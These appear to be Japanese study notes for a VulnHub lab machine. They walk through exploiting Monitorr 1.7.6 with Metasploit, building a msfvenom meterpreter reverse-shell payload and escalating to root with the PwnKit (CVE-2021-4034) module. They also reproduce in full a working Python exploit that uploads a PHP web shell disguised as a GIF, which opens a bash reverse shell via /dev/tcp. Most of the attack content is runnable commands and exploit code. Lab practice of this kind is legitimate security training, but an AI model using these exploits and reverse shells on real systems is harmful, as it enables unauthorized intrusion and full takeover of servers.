- スナップショットとる
### 論点
- exploit
- suggesterができないのは、ターゲットのアーキテクチャとmetepreterのが異なるためだと思うが、どうやって変更するかわからん
  - phpはできるlinux dropは上手くできない 

## 攻略
- nmapする
- サイトに接続するとMonitorのver1.7.6であることがわかる
- 脆弱性を利用して侵入する
```
msfconsole
search monitor 1.7.6
use 0
set rhosts 192.168.56.139
set targeturi /mon
set lhost 192.168.56.104
run
```
- /tmpに移動する
- Parrotに戻る
  - `bg`
- ここで改めて新しい、より高度なreverse-shellをする。
- まず新しいターミナルを開けて、~/vulnhub/icmp/にmsfvenomを利用してreverse-shellをする
  - 高度なphp-reverse-shellみたいなもの 
  - `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=Parrotのアドレス lport=4444 -a x64 -f elf -o payload.elf`
- msfに戻る
  - `upload payload.elf`
- targetに戻る
  - `sessions -i 1`
  - shellになって対話型シェルにする
  - `chmod +x payload.elf`
- 新しいターミナルで、より高度なhandlerで待ち受ける
```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost Parrotのアドレス
set lport 4444
run
```
- targetでpayloadを実行する
  - `./payload.elf` 

- suggesterを使う
```
search suggester
use 0
options
set session 1
run
```

- rootになれる脆弱性の候補が緑色で表示される

```
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set session 1
set lport 4545
run
shell
```
## code
- postで設置、getで実行
- 画像の中にreverse-shellを埋め込んでpostしている
```py

#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    requests.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers=headers)

```
